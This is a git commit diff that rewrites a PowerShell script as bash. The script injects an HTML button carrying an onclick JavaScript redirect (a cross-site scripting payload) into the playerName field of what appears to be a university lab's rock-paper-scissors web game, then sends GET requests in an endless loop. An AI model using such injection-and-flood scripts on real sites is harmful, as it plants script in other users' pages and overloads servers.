dde3526f07fdd30039185c5450adedcde38965b1
nico.tuscano <nico.tuscano@ost.ch>
2024-11-19 16:09:52 +0100

    bash

--- test.sh
+++ test.sh
@@ -1,19 +1,14 @@
-# PowerShell script to send GET requests indefinitely using Invoke-RestMethod
+#!/bin/bash
 
 # Encoded button tag with JavaScript
-$encoded_button_tag = "%3Cbutton%20onclick%3D%22window.location.href%20%3D%20'https%3A%2F%2Fstone.sifs0005.infs.ch%2F91912126-58d8-4382-a77e-05621539c7f1'%3B%22%3EClick%20Me%3C%2Fbutton%3E"
-
-# Replace && with && (no encoding needed)
-$encodedImgTag = $encoded_button_tag -replace "&amp;&amp;", "&&"
+encoded_button_tag="<button onclick=\"window.location.href = 'https://stone.sifs0005.infs.ch/91912126-58d8-4382-a77e-05621539c7f1';\">Click Me</button>"
 
 # Replace this URL with your target URL
-$URL = "https://stone.sifs0005.infs.ch/play?playerName=$encodedImgTag&playerHand=Rock&mode=spock"
+URL="https://stone.sifs0005.infs.ch/play?playerName=$encoded_button_tag&playerHand=Rock&mode=spock"
 
-$i = 1
-while ($true) {
-    Write-Host "Sending GET request $i to $URL"
-    Invoke-RestMethod -Uri $URL -Method Get | Out-Null
-    $i++
-}
-
-Write-Host "Script is running indefinitely. Press Ctrl + C to stop."
+i=1
+while true; do
+    echo "Sending GET request $i to $URL"
+    curl -s "$URL" > /dev/null
+    ((i++))
+done
